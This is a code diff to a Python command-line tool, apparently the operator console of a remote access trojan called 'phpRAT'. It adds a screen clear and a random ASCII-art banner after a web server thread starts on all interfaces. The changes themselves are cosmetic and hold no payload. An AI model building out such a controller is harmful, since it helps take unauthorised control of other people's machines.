@@ -6,6 +6,10 @@ from datetime import datetime
 import re
 from tabulate import tabulate
 import sys
+import time
+from os import system, name
+from pyfiglet import Figlet
+import random
 
 
 class CLI(cmd.Cmd):
@@ -189,7 +193,7 @@ class CLI(cmd.Cmd):
         return commands[::-1]
 
     def emptyline(self):
-         pass
+        pass
 
 
 if __name__ == "__main__":
@@ -199,5 +203,11 @@ if __name__ == "__main__":
     baburao_thread = threading.Thread(
         target=app.run, kwargs={'host': '0.0.0.0'}, daemon=True)
     baburao_thread.start()
+    time.sleep(1)
+    system('cls' if name == 'nt' else 'clear')
+    fonts_list = ['basic', 'big', 'chunky','slant','epic','standard']
+    font = random.choice(fonts_list)
+    f = Figlet(font=font)
+    print(f.renderText('phpRAT'))
     cli = CLI()
     cli.cmdloop()
